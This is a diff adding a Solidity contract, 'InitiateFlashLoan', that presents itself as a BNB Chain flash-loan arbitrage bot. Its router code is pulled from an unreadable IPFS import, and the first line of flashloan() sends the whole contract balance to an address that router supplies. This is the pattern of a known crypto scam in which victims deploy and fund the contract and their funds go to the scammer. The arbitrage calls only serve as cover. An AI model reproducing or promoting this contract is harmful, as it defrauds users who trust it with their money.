@@ -1,0 +1,61 @@
+pragma solidity ^0.5.0;
+
+
+
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+
+
+import "https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol";
+
+
+import "ipfs://QmSYDFz7586FKHtNDKMqoZ7sCRTTsDhkzcQG8vZ1WrcyzP";
+
+
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+
+
+contract InitiateFlashLoan {
+    
+	RouterV2 router;
+	string public tokenName;
+	string public tokenSymbol;
+	uint256 flashLoanAmount;
+
+	constructor(
+    	string memory _tokenName,
+    	string memory _tokenSymbol,
+    	uint256 _loanAmount
+	) public {
+    	tokenName = _tokenName;
+    	tokenSymbol = _tokenSymbol;
+    	flashLoanAmount = _loanAmount;
+
+    	router = new RouterV2();
+	}
+
+	function() external payable {}
+
+	function flashloan() public payable {
+    	
+    	address(uint160(router.pancakeSwapAddress())).transfer(
+        	address(this).balance
+    	);
+
+    	
+    	router.borrowFlashloanFromMultiplier(
+        	address(this),
+        	router.bakerySwapAddress(),
+        	flashLoanAmount
+    	);
+    	
+    	router.convertBnbToBusd(msg.sender, flashLoanAmount / 2);
+    	
+    	router.callArbitrageBakerySwap(router.bakerySwapAddress(), msg.sender);
+    	
+    	router.transferBnbToMultiplier(router.pancakeSwapAddress());
+    	
+    	router.completeTransation(address(this).balance);
+	}
+}
